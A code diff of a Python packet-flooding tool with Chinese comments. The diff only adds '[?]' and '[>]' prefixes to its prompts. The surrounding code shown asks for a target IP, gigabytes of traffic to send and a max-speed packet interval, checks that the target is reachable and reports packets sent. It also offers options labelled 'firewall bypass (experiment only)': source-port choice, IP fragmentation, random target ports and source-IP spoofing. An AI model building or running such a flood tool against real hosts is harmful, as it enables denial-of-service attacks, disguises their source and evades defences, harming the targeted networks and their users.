@@ -40,7 +40,7 @@ print("")
 # 目标 IP 验证
 while True:
     try:
-        ip_str = input("IP Target : ").strip()
+        ip_str = input("[?]IP Target : ").strip()
         ipaddress.ip_address(ip_str)
         target_ip = ip_str
         break
@@ -62,7 +62,7 @@ while True:
 # 总流量输入（单位 GB）
 while True:
     try:
-        gb_str = input("Total data to send (GB) : ").strip()
+        gb_str = input("[>]Total data to send (GB) : ").strip()
         total_gb = float(gb_str)
         if total_gb <= 0:
             print("[!] 流量必须大于 0 GB。")
@@ -74,24 +74,24 @@ while True:
 # 可选速率限制（发包间隔）
 rate_limit = 0.0
 try:
-    rate_str = input("Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
+    rate_str = input("[>]Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
     rate_limit = float(rate_str)
 except ValueError:
     rate_limit = 0.0
 
 # ---------- 防火墙绕过选项 ----------
 print("\n--- 防火墙绕过选项 (仅供实验) ---")
-src = input("指定源端口 (留空则系统随机分配): ").strip()
+src = input("[?]指定源端口 (留空则系统随机分配): ").strip()
 source_port = int(src) if src else None
 
-frag = input("启用 IP 分片? (y/N): ").strip().lower()
+frag = input("[?]启用 IP 分片? (y/N): ").strip().lower()
 use_fragmentation = (frag == 'y')
 
-rnd = input("使用随机目标端口? (y/N): ").strip().lower()
+rnd = input("[?]使用随机目标端口? (y/N): ").strip().lower()
 random_target_port = (rnd == 'y')
 
 # --- 伪造源 IP 选项 ---
-spoof_ip = input("伪造源 IP 地址 (留空则不伪造): ").strip()
+spoof_ip = input("[?]伪造源 IP 地址 (留空则不伪造): ").strip()
 if spoof_ip:
     try:
         ipaddress.ip_address(spoof_ip)   # 验证合法性
@@ -135,7 +135,7 @@ def check_target(ip, port):
 print("[*] 正在检查目标连通性...")
 if not check_target(target_ip, target_port):
     print("[!] 目标似乎不可达或 TCP 端口未开放。")
-    choice = input("是否仍要尝试发送？(y/n): ").strip().lower()
+    choice = input("[?]是否仍要尝试发送？(y/n): ").strip().lower()
     if choice != 'y':
         sys.exit(1)
 
@@ -249,7 +249,7 @@ try:
             mb_sent = sent_bytes / (1024 * 1024)
             elapsed = time.time() - start_time
             pps = sent / elapsed if elapsed > 0 else 0
-            print(f"已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
+            print(f"[>]已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
             next_mb_threshold += 1024 * 1024
 
         # 速率限制
